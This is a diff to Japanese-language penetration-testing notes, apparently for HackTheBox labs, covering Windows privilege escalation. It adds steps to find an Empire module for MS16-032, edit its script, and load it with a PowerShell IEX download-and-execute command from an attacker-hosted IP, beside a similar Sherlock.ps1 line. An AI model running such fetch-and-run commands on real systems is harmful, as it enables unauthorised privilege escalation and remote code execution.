@@ -936,6 +936,22 @@ IEX(New-Object Net.Webclient).downloadString('http://10.10.14.5:8000/Sherlock.ps
 
 ```
 
+vulnerable がみつかったら、empire にmodule があるかチェック
+
+[参考記事](https://iammainul.medium.com/hackthebox-optimum-walkthrough-powershell-only-21e17a8d29b3)
+
+ex: MS16-032
+
+```
+
+Empire/data/module_source/privesc/Invoke-MS16032.ps1
+
+vi で使い方見て、ファイルの最終行を編集し
+
+IEX(New-Object Net.Webclient).downloadString('http://10.10.14.15/Invoke-MS16032.ps1')
+
+```
+
 ## metasploit(local_exploit_suggester)
 
 [https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/post/multi/recon/local_exploit_suggester.md](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/post/multi/recon/local_exploit_suggester.md)
